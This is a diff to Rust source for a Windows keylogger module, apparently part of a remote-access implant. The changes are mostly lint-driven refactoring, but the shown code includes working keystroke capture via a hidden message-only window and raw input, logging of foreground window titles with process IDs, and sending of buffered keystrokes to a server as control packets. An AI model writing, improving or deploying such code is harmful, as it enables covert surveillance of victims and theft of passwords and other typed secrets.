@@ -1,3 +1,4 @@
+use std::fmt::Write as _;
 use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
 use std::sync::Arc;
 use std::thread::{self, JoinHandle};
@@ -19,8 +20,8 @@ use windows::Win32::UI::Input::{
 use windows::Win32::UI::WindowsAndMessaging::{
     CreateWindowExW, DefWindowProcW, DestroyWindow, DispatchMessageW, GetForegroundWindow,
     GetMessageW, GetWindowTextW, GetWindowThreadProcessId, HMENU, HWND_MESSAGE, MSG,
-    PostThreadMessageW, RegisterClassExW, SetTimer, TranslateMessage, UnregisterClassW, WM_INPUT,
-    WM_KEYDOWN, WM_QUIT, WM_TIMER, WNDCLASSEXW, WS_EX_NOACTIVATE,
+    PostThreadMessageW, RegisterClassExW, SetTimer, TranslateMessage, UnregisterClassW, WINDOW_STYLE,
+    WM_INPUT, WM_KEYDOWN, WM_QUIT, WM_TIMER, WNDCLASSEXW, WS_EX_NOACTIVATE,
 };
 use windows::core::{PCWSTR, w};
 
@@ -52,10 +53,7 @@ pub struct KeyloggerSession {
 impl KeyloggerSession {
     /// Start a keylogger session. Spawns a thread that captures keystrokes
     /// and sends them to the server via `KeyloggerData` packets.
-    ///
-    /// # Errors
-    /// Returns `NetworkError` if the session cannot be started.
-    pub fn start(manager: Arc<MultiplexManager>) -> Result<Self, NetworkError> {
+    pub fn start(manager: Arc<MultiplexManager>) -> Self {
         let stop_flag = Arc::new(AtomicBool::new(false));
         let thread_id = Arc::new(AtomicU32::new(0));
 
@@ -63,16 +61,16 @@ impl KeyloggerSession {
         let tid_clone = thread_id.clone();
 
         let join_handle = thread::spawn(move || {
-            if let Err(e) = run_keylogger(manager, stop_clone, tid_clone) {
+            if let Err(e) = run_keylogger(manager, &stop_clone, &tid_clone) {
                 eprintln!("Keylogger error: {e}");
             }
         });
 
-        Ok(Self {
+        Self {
             stop_flag,
             thread_id,
             join_handle: Some(join_handle),
-        })
+        }
     }
 
     /// Stop the keylogger session and wait for the thread to finish.
@@ -102,16 +100,15 @@ impl Drop for KeyloggerSession {
 
 fn run_keylogger(
     manager: Arc<MultiplexManager>,
-    stop_flag: Arc<AtomicBool>,
-    thread_id: Arc<AtomicU32>,
+    stop_flag: &Arc<AtomicBool>,
+    thread_id: &Arc<AtomicU32>,
 ) -> Result<(), NetworkError> {
     unsafe {
         // Store current thread ID so we can post WM_QUIT from another thread
         thread_id.store(GetCurrentThreadId(), Ordering::Relaxed);
 
         let hinstance = GetModuleHandleW(None).map_err(|e| {
-            NetworkError::IoError(std::io::Error::new(
-                std::io::ErrorKind::Other,
+            NetworkError::IoError(std::io::Error::other(
                 format!("GetModuleHandleW failed: {e}"),
             ))
         })?;
@@ -125,10 +122,9 @@ fn run_keylogger(
             ..Default::default()
         };
 
-        let atom = RegisterClassExW(&wc);
+        let atom = RegisterClassExW(&raw const wc);
         if atom == 0 {
-            return Err(NetworkError::IoError(std::io::Error::new(
-                std::io::ErrorKind::Other,
+            return Err(NetworkError::IoError(std::io::Error::other(
                 "RegisterClassExW failed",
             )));
         }
@@ -138,7 +134,7 @@ fn run_keylogger(
             WS_EX_NOACTIVATE,
             KEYLOG_CLASS_NAME,
             None,
-            Default::default(),
+            WINDOW_STYLE::default(),
             0,
             0,
             0,
@@ -149,9 +145,8 @@ fn run_keylogger(
             None,
         )
         .map_err(|e| {
-            UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
-            NetworkError::IoError(std::io::Error::new(
-                std::io::ErrorKind::Other,
+            let _ = UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
+            NetworkError::IoError(std::io::Error::other(
                 format!("CreateWindowExW failed: {e}"),
             ))
         })?;
@@ -167,9 +162,8 @@ fn run_keylogger(
         RegisterRawInputDevices(&[raw_device], u32::try_from(size_of::<RAWINPUTDEVICE>()).unwrap_or(0))
             .map_err(|e| {
                 let _ = DestroyWindow(hwnd);
-                UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
-                NetworkError::IoError(std::io::Error::new(
-                    std::io::ErrorKind::Other,
+                let _ = UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
+                NetworkError::IoError(std::io::Error::other(
                     format!("RegisterRawInputDevices failed: {e}"),
                 ))
             })?;
@@ -193,14 +187,14 @@ fn run_keylogger(
                 break;
             }
 
-            let ret = GetMessageW(&mut msg, None, 0, 0);
+            let ret = GetMessageW(&raw mut msg, None, 0, 0);
             if !ret.as_bool() {
                 // WM_QUIT received or error
                 break;
             }
 
-            let _ = TranslateMessage(&msg);
-            DispatchMessageW(&msg);
+            let _ = TranslateMessage(&raw const msg);
+            DispatchMessageW(&raw const msg);
         }
 
         // Flush remaining buffer
@@ -208,7 +202,7 @@ fn run_keylogger(
 
         // Cleanup
         let _ = DestroyWindow(hwnd);
-        UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
+        let _ = UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
 
         // Clear thread-local state
         KEYLOGGER_STATE.with(|state| {
@@ -246,7 +240,7 @@ unsafe fn handle_raw_input(lparam: LPARAM) {
     // Get required buffer size
     let mut size: u32 = 0;
     let header_size = u32::try_from(size_of::<RAWINPUTHEADER>()).unwrap_or(0);
-    let _ = unsafe { GetRawInputData(hrawinput, RID_INPUT, None, &mut size, header_size) };
+    let _ = unsafe { GetRawInputData(hrawinput, RID_INPUT, None, &raw mut size, header_size) };
 
     if size == 0 {
         return;
@@ -259,7 +253,7 @@ unsafe fn handle_raw_input(lparam: LPARAM) {
             hrawinput,
             RID_INPUT,
             Some(buffer.as_mut_ptr().cast()),
-            &mut size,
+            &raw mut size,
             header_size,
         )
     };
@@ -322,7 +316,7 @@ fn process_key(vkey: u32) {
                 let mut keyboard_state = [0u8; 256];
                 let mut unicode_buf = [0u16; 2];
                 unsafe {
-                    GetKeyboardState(&mut keyboard_state);
+                    let _ = GetKeyboardState(&mut keyboard_state);
                     let scan_code = MapVirtualKeyW(vkey, MAPVK_VK_TO_VSC);
                     let result = ToUnicode(
                         vkey,
@@ -345,10 +339,10 @@ fn process_key(vkey: u32) {
         if state.buffer.len() >= KEYLOG_BUFFER_MAX {
             let data = std::mem::take(&mut state.buffer);
             let packet = KeyloggerData::new(data.into_bytes());
-            if let Ok(buf) = packet.serialize() {
-                if let Err(e) = state.manager.send_control_packet(&buf) {
-                    eprintln!("Failed to send keylogger data: {e}");
-                }
+            if let Ok(buf) = packet.serialize()
+                && let Err(e) = state.manager.send_control_packet(&buf)
+            {
+                eprintln!("Failed to send keylogger data: {e}");
             }
         }
     });
@@ -365,18 +359,18 @@ fn process_window_title(state: &mut KeyloggerState) {
         let len = GetWindowTextW(foreground, &mut title_buf);
 
         let title = if len > 0 {
-            String::from_utf16_lossy(&title_buf[..len as usize])
+            #[allow(clippy::cast_sign_loss)]
+            let title_len = len as usize;
+            String::from_utf16_lossy(&title_buf[..title_len])
         } else {
             "(No Title)".to_string()
         };
 
         if title != state.last_title {
             let mut process_id: u32 = 0;
-            GetWindowThreadProcessId(foreground, Some(&mut process_id));
+            GetWindowThreadProcessId(foreground, Some(&raw mut process_id));
 
-            state
-                .buffer
-                .push_str(&format!("\n\n[{process_id}] {title}\n"));
+            let _ = write!(state.buffer, "\n\n[{process_id}] {title}\n");
             state.last_title = title;
         }
     }
@@ -395,10 +389,10 @@ fn flush_buffer() {
 
         let data = std::mem::take(&mut state.buffer);
         let packet = KeyloggerData::new(data.into_bytes());
-        if let Ok(buf) = packet.serialize() {
-            if let Err(e) = state.manager.send_control_packet(&buf) {
-                eprintln!("Failed to flush keylogger data: {e}");
-            }
+        if let Ok(buf) = packet.serialize()
+            && let Err(e) = state.manager.send_control_packet(&buf)
+        {
+            eprintln!("Failed to flush keylogger data: {e}");
         }
     });
 }
